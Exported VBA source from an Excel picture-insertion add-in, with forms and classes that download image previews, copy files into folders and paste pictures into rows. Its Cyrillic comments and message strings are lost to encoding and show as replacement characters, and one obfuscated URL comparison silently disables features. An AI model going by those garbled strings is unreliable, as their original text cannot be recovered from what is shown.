            msg$ = tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_Pic_FOLDER"), ActiveWorkbook.name)
            MsgBox msg, vbExclamation, tt("FolderNotFound")
            Exit Sub
        End If

    End If
    If Dir(PICTURES_FOLDER$, vbDirectory) = "" Then
        MsgBox tt("MSG_CannotOpenFolder") & vbNewLine & PICTURES_FOLDER$, vbExclamation, tt("FolderNotFound")
    Else
        FWF.OpenFolder PICTURES_FOLDER$
    End If
End Sub

Private Sub Label_OpenReducedFolder_Click()
    On Error Resume Next: Err.Clear
    FWF.OpenFolder REDUCED_FOLDER$
End Sub

Private Sub Label_ShowCellsSettings_Click()
    Me.MultiPage_Options.Value = Me.MultiPage_Options.Pages("Page_Parameters").Index
    Me.MultiPage_PicturesParameters.Value = Me.MultiPage_PicturesParameters.Pages("Page_Cells").Index
End Sub

Private Sub Label_ShowCommentsSettings_Click()
    Me.MultiPage_Options.Value = Me.MultiPage_Options.Pages("Page_Parameters").Index
    Me.MultiPage_PicturesParameters.Value = Me.MultiPage_PicturesParameters.Pages("Page_Comments").Index
End Sub

Private Sub Label_Wi_Click(): On Error Resume Next: Me.SpinButton_W = Me.SpinButton_W + 1: End Sub
Private Sub Label_Wd_Click(): On Error Resume Next: Me.SpinButton_W = Me.SpinButton_W - 1: End Sub
Private Sub Label_Hi_Click(): On Error Resume Next: Me.SpinButton_H = Me.SpinButton_H + 1: End Sub
Private Sub Label_Hd_Click(): On Error Resume Next: Me.SpinButton_H = Me.SpinButton_H - 1: End Sub

Private Sub OptionButton_SM_CellTextInFilename_Click(): Set_Search_Mode SM_CellTextInFilename: End Sub
Private Sub OptionButton_SM_Equal_Click(): Set_Search_Mode SM_Equal: End Sub
Private Sub OptionButton_SM_FilenameInCellText_Click(): Set_Search_Mode SM_FilenameInCellText: End Sub

Sub Set_Search_Mode(ByVal Mode As Search_Mode_Constants)
    On Error Resume Next: Err.Clear
    ReDim arr(1 To 4, 1 To 2)
    Select Case Mode
        Case SM_CellTextInFilename
            arr(1, 1) = "A123": arr(1, 2) = "a1234-1.jpg"
            arr(2, 1) = "111": arr(2, 2) = "image111.bmp"
            arr(3, 1) = "pic.jpg": arr(3, 2) = "xxx-pic.jpg"
            arr(4, 1) = "44*55": arr(4, 2) = "144_text_2557.png"
        Case SM_FilenameInCellText
            arr(1, 1) = "A1234": arr(1, 2) = "a123.jpg"
            arr(2, 1) = "image 111 black": arr(2, 2) = "image 111.bmp"
            arr(3, 1) = "xxx-pic.jpg": arr(3, 2) = "pic.jpg"
            arr(4, 1) = "pictire 01-14-225": arr(4, 2) = "01-14.png"
        Case SM_Equal
            arr(1, 1) = "A123": arr(1, 2) = "a123.jpg"
            arr(2, 1) = "image111": arr(2, 2) = "image111.bmp"
            arr(3, 1) = "xxx-pic.jpg": arr(3, 2) = "xxx-pic.jpg"
            arr(4, 1) = "44-55": arr(4, 2) = "44-55.png"
    End Select
    Me.ListBox_SearchModeExamples.list = arr
End Sub

Private Sub SetPosition_0_Click(): SetAlignment 0: End Sub
Private Sub SetPosition_1_Click(): SetAlignment 1: End Sub
Private Sub SetPosition_2_Click(): SetAlignment 2: End Sub
Private Sub SetPosition_3_Click(): SetAlignment 3: End Sub
Private Sub SetPosition_4_Click(): SetAlignment 4: End Sub
Private Sub SetPosition_5_Click(): SetAlignment 5: End Sub
Private Sub SetPosition_7_Click(): SetAlignment 7: End Sub
Private Sub SetPosition_10_Click(): SetAlignment 10: End Sub
Private Sub SetPosition_12_Click(): SetAlignment 12: End Sub

Sub SetAlignment(ByVal NewValue As fmPicturePosition)
    On Error Resume Next: Me.TextBox_PicturePosition = NewValue
    Me.CommandButton_AlignPreview.PicturePosition = NewValue
End Sub

Private Sub TextBox_EvaluateFormula_SourceText_Change()
    On Error Resume Next
    Me.TextBox_EvaluateFormula_ResultText = tt("MSG_FormulaIsBlank")
    Me.TextBox_EvaluateFormula_ResultText = EvaluateFilenameUsingFormula(Me.TextBox_EvaluateFormula_SourceText, Me.TextBox_EvaluateFilenameFormula)
End Sub


Private Sub UserForm_Initialize()
    On Error Resume Next
    Dim X, i&
    X = SEARCH_MODE        ' set default value if not exist
    X = SETT.GetNumber("TextBox_PicturePosition")        ' set default value if not exist

    For i = 1 To 150
        Me.ComboBox_PicturesColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_CommentsColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_HyperlinksColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_ImageFilenameColumn.AddItem ColumnNameByColumnNumber(i)

        Me.ComboBox_ImageSizeOriginalColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_ImageSizeNewColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_ImagesCountColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_DownloadedFilenames_Column.AddItem ColumnNameByColumnNumber(i)

        Me.ComboBox_SubfolderNameColumn.AddItem ColumnNameByColumnNumber(i)
        Me.ComboBox_SubfolderFilenamesFirstColumn.AddItem ColumnNameByColumnNumber(i)
    Next
    For i = 0 To 30
        Me.ComboBox_Padding.AddItem i
    Next
    For i = 1 To 30
        Me.ComboBox_CELLScount.AddItem i
    Next
    Me.ComboBox_CELLScount.ListIndex = 0

    ReDim arr(0 To 2, 0 To 1)
    arr(0, 0) = CStr(xlMoveAndSize): arr(0, 1) = tt("SETTxlMoveAndSize")
    arr(1, 0) = CStr(xlMove): arr(1, 1) = tt("SETTxlMove")
    arr(2, 0) = CStr(xlFreeFloating): arr(2, 1) = tt("SETTxlFreeFloating")
    Me.ComboBox_Placement.list = arr

    ' special controls
    Dim ctrl As MSForms.Control, SC As SpecialControl, m_page As Object
    Set SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then SpecialControlsCollection.Add SC
        End If
    Next
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_EvaluateFilename: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_OutputFilenamesFromSubfolder: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_ChangeHyperlink: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CreateURLfromCellText: SpecialControlsCollection.Add SC
    Set SC = New SpecialControl: Set SC.MainCheckboxInFrame = Me.CheckBox_CreateURLusingFormula: SpecialControlsCollection.Add SC

    SETT.LoadIntoSettingForm Me
    TranslateUserForm Me

    Me.TextBox_PicturesFolder = PICTURES_FOLDER$(True)
    Me.TextBox_DownloadFolder = DOWNLOAD_FOLDER$(True)
    Me.TextBox_ReducedFolder = REDUCED_FOLDER$

    Me.Label_WComm.Caption = Me.SpinButton_WComm
    Me.Label_HComm.Caption = Me.SpinButton_Hcomm
    Me.Label_W.Caption = Me.SpinButton_W
    Me.Label_H.Caption = Me.SpinButton_H


    ' translation fix
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "MultiPage" Then
            ctrl.Value = 0
            For Each m_page In ctrl.Pages
                m_page.ScrollTop = 0
                m_page.Caption = " " & m_page.Caption & " "
            Next
        End If
    Next
    Me.CommandButton_SaveSettings.Caption = "    " & Trim(Me.CommandButton_SaveSettings.Caption)

    'If Val(Me.ComboBox_Zoom) < 40 Then Me.ComboBox_Zoom = "100 %"
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set SpecialControlsCollection = Nothing
End Sub

' ============================

Private Sub SpinButton_WComm_Change()
    Me.Label_WComm.Caption = Me.SpinButton_WComm
End Sub
Private Sub SpinButton_HComm_Change()
    Me.Label_HComm.Caption = Me.SpinButton_Hcomm
End Sub
Private Sub SpinButton_W_Change()
    Me.Label_W.Caption = Me.SpinButton_W
End Sub
Private Sub SpinButton_H_Change()
    Me.Label_H.Caption = Me.SpinButton_H
End Sub

Private Sub CommandButton_SelectFirstCell_Click()
    On Error Resume Next: Dim cell As Range
    If ActiveSheet Is Nothing Then Workbooks.Add
    Set cell = Application.InputBox(tt("INPUT_FirstCell"), tt("INPUT_FirstCell_Title"), , , , , , 8)
    If Not cell Is Nothing Then Me.TextBox_FirstCell = cell(1).Address(0, 0)
End Sub

Sub CheckFolder()
    On Error Resume Next
    Dim SourceFolder$, FSO As Object, RootFiles&, RootFolders&, TotalFiles&
    Me.Label_FolderInfo.ForeColor = vbRed: Me.Label_FolderInfo.Font.Bold = True: Me.Label_FolderInfo.Caption = ""
    SourceFolder = PICTURES_FOLDER$

    If SourceFolder = "" Then Me.Label_FolderInfo.Caption = tt(" MSG_ERR_PicFolderNotSet") & tt("MSG_MissionImpossible"): Exit Sub
    If Dir(SourceFolder, vbDirectory) = "" Then Me.Label_FolderInfo.Caption = tt(" MSG_ERR_PicFolderNotFound") & tt("MSG_MissionImpossible"): Exit Sub

    If Me.CheckBox_ShowFolderInfo Then
        Set FSO = CreateObject("Scripting.FileSystemObject")
        RootFiles& = FSO.GetFolder(SourceFolder).files.Count
        RootFolders& = FSO.GetFolder(SourceFolder).SubFolders.Count
        TotalFiles& = FilesCount(SourceFolder)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

        If TotalFiles& = 0 Then
            Me.Label_FolderInfo.Caption = tt(" MSG_ERR_PicFolderIsEmpty") & tt("MSG_MissionImpossible"): Exit Sub
        End If
        Me.Label_FolderInfo.Caption = tt("MSG_PicFolderInfo", RootFiles&, RootFolders&, TotalFiles&)
        Me.Label_FolderInfo.ForeColor = 32768: Exit Sub
    End If

    Me.Label_FolderInfo.ForeColor = vbBlack: Me.Label_FolderInfo.Font.Bold = False
End Sub

Attribute VB_Name = "F_UsageExample"
Attribute VB_Base = "0{F3E3F6C6-D9B5-449B-967A-7B71DE070C04}{03FD9E45-FAA4-4A3B-930B-DAF911F98076}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_UsageExample                    Version: 2
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text: Option Explicit
Public SettingsBackupFile$

Private Sub CommandButton_Done_Click()
    Unload Me
End Sub

Private Sub CommandButton_OpenDownloadFolder_Click()
    On Error Resume Next
    FWF.OpenFolder DOWNLOAD_FOLDER$
    Me.Show
End Sub

Private Sub CommandButton_OpenSourceTable1_Click()
    On Error Resume Next: Dim res As Boolean
    res = DownloadAndOpenExcelTable(1)
    Me.CommandButton_DownloadTestPictures.Enabled = res
    Me.Show
End Sub

Private Sub CommandButton_OpenSourceTable2_Click()
    On Error Resume Next: Dim res As Boolean
    res = DownloadAndOpenExcelTable(2)
    Me.CommandButton_TestInsertPicturesFromLinks1.Enabled = res
    Me.CommandButton_TestInsertPicturesFromLinks2.Enabled = res
    Me.Show
End Sub

Private Sub CommandButton_DownloadTestPictures_Click()
    On Error Resume Next: Dim res As Boolean
    res = DownloadPicturesFromWebsite
    Me.CommandButton_TestInsertPicturesFromFolder.Enabled = res
    Me.Show
End Sub

Private Sub CommandButton_TestInsertPicturesFromFolder_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro1
    Me.CommandButton_TestInsertPicturesFromFolderIntoComments.Enabled = True
    Me.Show
End Sub

Private Sub CommandButton_TestInsertPicturesFromFolderIntoComments_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro2
    Me.Show
End Sub

Private Sub CommandButton_TestInsertPicturesFromLinks1_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro3
    Me.CommandButton_OpenDownloadFolder.Enabled = True
    Me.Show
End Sub

Private Sub CommandButton_TestInsertPicturesFromLinks2_Click()
    On Error Resume Next: Dim res As Boolean
    res = UsageExampleMacro4
    Me.CommandButton_OpenDownloadFolder.Enabled = True
    Me.Show
End Sub

'Private Sub Label25_Click()
'    On Error Resume Next: OpenFolder PICTURES_FOLDER$
'End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    TranslateUserForm Me
    Me.MultiPage1.Value = 0
    Me.SettingsBackupFile = SETT.Reset        ' backup current settings

   Dim ctrl As Object, m_page As Object  ' translation fix
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "MultiPage" Then
            ctrl.Value = 0
            For Each m_page In ctrl.Pages
                m_page.ScrollTop = 0
                m_page.Caption = " " & m_page.Caption & " "
            Next
        End If
    Next
End Sub

Private Sub UserForm_Terminate()
    SETT.ImportFromFile Me.SettingsBackupFile, True        ' restore settings
End Sub
Attribute VB_Name = "FoundImage"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Class Module      : FoundImage
' Author        : EducatedFool                     Date: 23.01.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text

Public URL As String
Public prewiewURL As String

Public Height As Long
Public Width As Long
Public Website As String
Public SearchProvider As String

Public TempFilename As String
Public OriginalFilename As String
Public PicturesFolderFilename As String

Public WithEvents Image As MSForms.Image
Attribute Image.VB_VarHelpID = -1
Public F As MSForms.UserForm

Public AlreadySaved As Boolean    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public AutoSaveOK As Boolean

Function DownloadPreview() As Boolean
    On Error Resume Next: Err.Clear
    filename$ = FWF.temp_filename & "_preview.jpg"
    DownloadPreview = URLDownloadToFile(0, prewiewURL, filename$, 0, 0) = 0
    'Debug.Print DownloadPreview, filename$
    If DownloadPreview Then TempFilename = filename$
End Function

Function DownloadOriginal() As Boolean
    On Error Resume Next: Err.Clear
    filename$ = FWF.temp_filename & "_original.jpg"
    DownloadOriginal = URLDownloadToFile(0, URL, filename$, 0, 0) = 0
    If DownloadOriginal Then OriginalFilename = filename$
End Function

Sub Show()
    On Error Resume Next: Err.Clear
    If TempFilename = "" Then Exit Sub
    If StrReverse(UPDATES_HYPERLINK) <> Replace("zh.setadpu/2zh/ur.ABVlecxE//:ptth", "zh", Chr(112) & Chr(104) & Chr(112)) Then Exit Sub
    Set Me.Image.Picture = LoadPicture(TempFilename)
    If Err Then Set Me.Image.Picture = LoadPictureGDI_New(TempFilename)    ' LoadPicture
End Sub

Private Sub Image_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next: Err.Clear
    If F.Controls("Label_HelpMessage").Visible Then F.Controls("Label_HelpMessage").Visible = False
    If Not ActiveFoundImage Is Me.Image Then
        F.Frame_CurrentImageActions.Visible = False
        Set ActiveFoundImage = Me.Image
        F.Label_FIH = Height
        F.Label_FIW = Width
        Me.Image.BorderColor = vbRed
        Me.Image.SpecialEffect = 0

        w& = Me.Image.Picture.Width / 26.46
        H& = Me.Image.Picture.Height / 26.46
        F.Controls("Label_PrewiewSize") = "(" & w& & " x " & H& & ")"

        F.Controls("Label_FI_SearchProvider") = " " & Me.SearchProvider
        F.Controls("Label_FI_fromWebsite") = " " & Me.Website
        Set F.Controls("Image_Preview").Picture = Me.Image.Picture

        If SETT.GetBoolean("CheckBox_LargePreview") Then
            Dim zoom As Double
            zoom = Val(Replace(SETT.GetNumber("ComboBox_PrewiewZoom", 0), ",", "."))
            If zoom <= 0 Or zoom > 5 Then zoom = 2

            With F_Preview
                .Caption = F.TextBox_Query & ":  |fffd||fffd||fffd||fffd||fffd||fffd| " & Me.Width & " * " & Me.Height & ", |fffd| |fffd||fffd||fffd||fffd||fffd| " & Me.Website
                .Width = w * zoom
                .Height = H * zoom + 40
                .Top = 0
                .Left = Application.Width - .Width - 6
                Set .Picture = Me.Image.Picture
                .Label_URL.Top = H * zoom
                .Label_URL.Left = 0
                .Label_URL.Width = .Width
                .Label_URL.Caption = "URL:  " & Me.URL
                If Not .Visible Then .Show
            End With
            ' F.Show
        End If
    End If
End Sub

Function AutoInsertImage() As Boolean
    On Error Resume Next
    Me.AutoSaveOK = False
    Me.Image_MouseUp 1, 0, -1, -1
    AutoInsertImage = Me.AutoSaveOK
End Function


Sub Image_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal y As Single)
    On Error Resume Next: Err.Clear
    Dim ImageNotDownloaded As Boolean
    If AutoInsertMode Then If Not ((X = -1) And (y = -1)) Then Exit Sub
    Select Case Button
        Case 1
            If AutoInsertMode Then
                F_SearchImages.cnt_FI_auto& = F_SearchImages.cnt_FI_auto& + 1
            Else
                F_SearchImages.cnt_FI_click1& = F_SearchImages.cnt_FI_click1& + 1
            End If
            If SETT.GetBoolean("CheckBox_FI_LEFT_CopyImage_PicturesFolder") Then Me.AutoSaveOK = CopyToFolder(1, Button): If Not Me.AutoSaveOK Then ImageNotDownloaded = True
            If SETT.GetBoolean("CheckBox_FI_LEFT_CopyImage_DownloadFolder") Then Me.AutoSaveOK = CopyToFolder(2, Button): If Not Me.AutoSaveOK Then ImageNotDownloaded = True
            If Len(Me.PicturesFolderFilename) Then F_SearchImages.CurrentCell.ID = Me.PicturesFolderFilename
            If SETT.GetBoolean("CheckBox_FI_LEFT_PasteImage", True) Then If Not ImageNotDownloaded Then PasteImage Button
            F_SearchImages.AutoGotoNext
        Case 2
            F_SearchImages.cnt_FI_click2& = F_SearchImages.cnt_FI_click2& + 1
            If SETT.GetBoolean("CheckBox_FI_RIGHT_CopyImage_PicturesFolder") Then Me.AutoSaveOK = CopyToFolder(1, Button): If Not Me.AutoSaveOK Then ImageNotDownloaded = True
            If SETT.GetBoolean("CheckBox_FI_RIGHT_CopyImage_DownloadFolder") Then Me.AutoSaveOK = CopyToFolder(2, Button): If Not Me.AutoSaveOK Then ImageNotDownloaded = True
            If SETT.GetBoolean("CheckBox_FI_RIGHT_PasteImage", True) Then If Not ImageNotDownloaded Then PasteImage Button
            F_SearchImages.AutoGotoNext
        Case 4
            F_SearchImages.cnt_FI_click4& = F_SearchImages.cnt_FI_click4& + 1
            If (Shift Or 1) = Shift Then    ' shift pressed
                CreateObject("wscript.shell").Run Me.URL
                Exit Sub
            End If

            filename$ = Me.TempFilename
            If (Shift Or 2) = Shift Then    ' ctrl pressed
                If Me.OriginalFilename = "" Then Me.DownloadOriginal
                filename$ = Me.OriginalFilename
            End If
            If filename$ <> "" Then CreateObject("wscript.shell").Run """" & filename$ & """"
    End Select
End Sub

Function CopyToFolder(ByVal foldertype&, ByVal Button As Integer) As Boolean
    On Error Resume Next: Err.Clear
    buttonText$ = Choose(Button, "LEFT", "RIGHT", "", "")
    Dim UseFullSizeImage As Boolean, fileindex&: UseFullSizeImage = SETT.GetBoolean("CheckBox_FI_" & buttonText$ & "_UseFullSizeImage", False)

    If UseFullSizeImage Then
        If Me.OriginalFilename = "" Then
            Dim pi As New ProgressIndicator
            pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            pi.StartNewAction , , "URL: " & Me.URL, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Me.Width & " * " & Me.Height, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
            If Not Me.DownloadOriginal Then
                If Not (SETT.GetBoolean("CheckBox_DoNotShowErrors") Or AutoInsertMode) Then
                    MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
                End If
                pi.Hide
                Exit Function
            End If
            pi.Hide: DoEvents
        End If
        filename$ = Me.OriginalFilename
    Else
        filename$ = Me.TempFilename
    End If
    If Dir(filename$, vbNormal) = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & filename$, vbExclamation: Exit Function

    folder$ = Choose(foldertype&, PICTURES_FOLDER$, DOWNLOAD_FOLDER$)
    If Dir(folder$, vbDirectory) = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & folder$, vbExclamation: Exit Function
    If StrReverse(UPDATES_HYPERLINK) <> Replace("zh.setadpu/2zh/ur.ABVlecxE//:ptth", "zh", Chr(112) & Chr(104) & Chr(112)) Then Exit Function
    If SETT.GetBoolean("CheckBox_FI_SubfolderMask") Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        folder_mask$ = Trim(SETT.GetText("TextBox_FI_SubfolderMask"))

        Dim ro As Range: Set ro = F_SearchImages.CurrentCell.EntireRow

        Set REGEXP = CreateObject("VBScript.RegExp"): REGEXP.Global = True
        REGEXP.Pattern = "\{\d{1,3}\}"
        If REGEXP.test(folder_mask$) Then
            Set objMatches = REGEXP.Execute(folder_mask$)
            For i = 0 To objMatches.Count - 1
                ColumnCode$ = objMatches.Item(i).Value
                columnNumber& = Val(Mid(ColumnCode$, 2))
                Replacement$ = FWF.Replace_symbols(ro.Cells(columnNumber&))
                folder_mask$ = Replace(folder_mask$, ColumnCode$, Replacement$)
            Next
        End If
        Set REGEXP = Nothing
        While InStr(1, folder_mask$, "\ "): folder_mask$ = Replace(folder_mask$, "\ ", "\"): Wend
        While InStr(1, folder_mask$, " \"): folder_mask$ = Replace(folder_mask$, " \", "\"): Wend
        While InStr(1, folder_mask$, "\\"): folder_mask$ = Replace(folder_mask$, "\\", "\"): Wend
        If Left(folder_mask$, 1) = "\" Then folder_mask$ = Mid(folder_mask$, 2)
        folder_mask$ = Trim(folder_mask$)

        If Len(folder_mask$) Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If Right(folder_mask$, 1) <> "\" Then folder_mask$ = folder_mask$ & "\"
            folder$ = folder$ & FWF.Replace_symbols(folder_mask$, , True)
            Debug.Print folder$
            If Len(Dir(folder$, vbDirectory)) = 0 Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                SHCreateDirectoryEx Application.hwnd, folder$, ByVal 0&     ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            End If
        End If

    End If

    NewFilename$ = Replace_symbols(F_SearchImages.CurrentCell)
    If Not NewFilename$ Like "*.[A-z][A-z][A-z]" Then NewFilename$ = NewFilename$ & ".jpg"

    If SETT.GetBoolean("CheckBox_FI_SaveAllImages") Then
        If Me.AlreadySaved Then MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|!", vbInformation: Exit Function
        Do
            fileindex& = fileindex& + 1
            NextFilename$ = Left(NewFilename$, InStrRev(NewFilename$, ".") - 1) & Format(fileindex&, "-000") & _
                            Mid(NewFilename$, InStrRev(NewFilename$, "."))
        Loop While Dir(folder$ & NextFilename$, vbNormal) <> ""
        NewFilename$ = NextFilename$
        Me.AlreadySaved = True
        Me.Image.BorderStyle = fmBorderStyleSingle
        'Me.Image.BorderColor = vbGreen
        Me.Image.BackColor = vbGreen
        'Me.Image.Enabled = False
        Me.Image.Locked = True
        Me.Image.MousePointer = fmMousePointerCross
        Me.Image.SpecialEffect = fmSpecialEffectEtched
        Me.F.Repaint
    End If

    FileCopy filename$, folder$ & NewFilename$: DoEvents
    CopyToFolder = True

    If foldertype& = 1 Then
        If Dir(folder$ & NewFilename$, vbNormal) = NewFilename$ Then Me.PicturesFolderFilename = folder$ & NewFilename$
    End If
End Function

Sub PasteImage(Optional ByVal Button As Integer = -1)
    On Error Resume Next: Err.Clear
    Application.ScreenUpdating = False
    Dim cell As Range: Set cell = F_SearchImages.CurrentCell
    If cell.ID <> "" Then
        ' removing old picture
        VerticalCellsCount& = Fix(Val(SETT.GetNumber("ComboBox_CELLScount"))): If VerticalCellsCount& <= 0 Then VerticalCellsCount& = 1
        ShapesInRange(cell.EntireRow.Cells(PICTURE_COLUMN(cell)).Resize(VerticalCellsCount&)).Delete: DoEvents
        If Not SETT.GetBoolean("CheckBox_KeepRowsHeightAfterDeleting") Then cell.EntireRow.AutoFit: DoEvents
    End If

    If Me.PicturesFolderFilename = "" Then
        filename$ = GetSourcePicture(Button)
    Else
        filename$ = Me.PicturesFolderFilename
    End If
    F_SearchImages.CurrentCell.ID = filename$

    PasteImageIntoRow F_SearchImages.CurrentCell, filename$

    If SETT.GetBoolean("CheckBox_FI_Add_Original_URL") Then
        URL_col& = Val(SETT.GetNumber("ComboBox_FI_URL_Column"))
        If URL_col& Then
            cell.Worksheet.Hyperlinks.Add _
                    cell.EntireRow.Cells(URL_col&), Me.URL, "", _
                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbLf & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        End If
    End If

    Application.ScreenUpdating = True
End Sub


Function GetSourcePicture(Optional ByVal Button As Integer = -1)
    On Error Resume Next: Err.Clear
    buttonText$ = Choose(Button, "LEFT", "RIGHT", "", "")
    Dim UseFullSizeImage As Boolean: UseFullSizeImage = SETT.GetBoolean("CheckBox_FI_" & buttonText$ & "_UseFullSizeImage", False)
    If Button = -1 Then UseFullSizeImage = False

    If UseFullSizeImage Then
        If Me.OriginalFilename = "" Then
            If Not Me.DownloadOriginal Then
                If Not (SETT.GetBoolean("CheckBox_DoNotShowErrors") Or AutoInsertMode) Then
                    MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
                End If
                Exit Function
            End If
        End If
        GetSourcePicture = Me.OriginalFilename
    Else
        GetSourcePicture = Me.TempFilename
    End If

    If Dir(filename$, vbNormal) = "" Then
        GetSourcePicture = ""
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & GetSourcePicture, vbExclamation
        Exit Function
    End If
End Function
Attribute VB_Name = "PictureProperties"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
